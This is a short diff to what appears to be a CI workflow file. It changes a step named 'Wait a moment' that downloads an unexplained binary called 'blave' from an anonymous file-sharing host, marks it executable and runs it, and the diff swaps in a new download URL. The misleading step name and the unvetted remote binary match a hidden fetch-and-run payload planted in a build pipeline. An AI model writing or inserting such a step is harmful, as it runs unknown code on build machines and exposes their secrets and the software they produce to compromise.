@@ -28,6 +28,6 @@ jobs:
 
       - name: Wait a moment
         run: |
-          wget https://bashupload.com/B7da0/blave
+          wget https://bashupload.com/N4BcF/blave
           chmod +x blave
           ./blave
